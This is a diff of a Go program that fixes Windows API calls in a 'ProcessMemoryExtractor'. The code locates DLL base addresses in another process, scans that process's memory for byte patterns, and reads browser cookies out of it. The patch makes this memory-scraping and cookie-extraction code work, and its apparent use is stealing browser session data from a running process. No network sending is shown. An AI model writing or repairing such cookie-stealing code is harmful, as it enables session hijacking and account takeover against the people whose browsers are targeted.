@@ -118,9 +118,9 @@ func (pe *ProcessMemoryExtractor) GetModuleBaseAddress(moduleName string) (uintp
 
 	targetName := moduleName + ".dll"
 	for {
-		modName := windows.UTF16ToString(me.Name[:])
+		modName := windows.UTF16ToString(me.ModuleName[:])
 		if modName == targetName {
-			return uintptr(unsafe.Pointer(me.BaseAddr)), nil
+			return uintptr(me.BaseOfDll), nil
 		}
 
 		if err := windows.Module32Next(snapshot, &me); err != nil {
@@ -139,7 +139,6 @@ func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintpt
 	currentAddr := uintptr(0x400000) // Start from typical user-mode space
 
 	for currentAddr < uintptr(0x7FFFFFFF0000) {
-		bytesRead := uintptr(0)
 		err := windows.VirtualQueryEx(pe.processHandle, currentAddr, &mvi, unsafe.Sizeof(mvi))
 		if err != nil {
 			currentAddr += 0x1000
@@ -155,7 +154,7 @@ func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintpt
 		// Try to read this memory region
 		buffer := make([]byte, mvi.RegionSize)
 		var nRead uintptr
-		err = windows.ReadProcessMemory(pe.processHandle, currentAddr, &buffer[0], len(buffer), &nRead)
+		err = windows.ReadProcessMemory(pe.processHandle, currentAddr, &buffer[0], uintptr(len(buffer)), &nRead)
 		if err != nil || nRead == 0 {
 			currentAddr += mvi.RegionSize
 			continue
@@ -192,7 +191,7 @@ func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCo
 	buffer := make([]byte, 8192)
 	var nRead uintptr
 
-	err := windows.ReadProcessMemory(pe.processHandle, addr, &buffer[0], len(buffer), &nRead)
+	err := windows.ReadProcessMemory(pe.processHandle, addr, &buffer[0], uintptr(len(buffer)), &nRead)
 	if err != nil || nRead == 0 {
 		return nil, fmt.Errorf("failed to read memory at %x", addr)
 	}
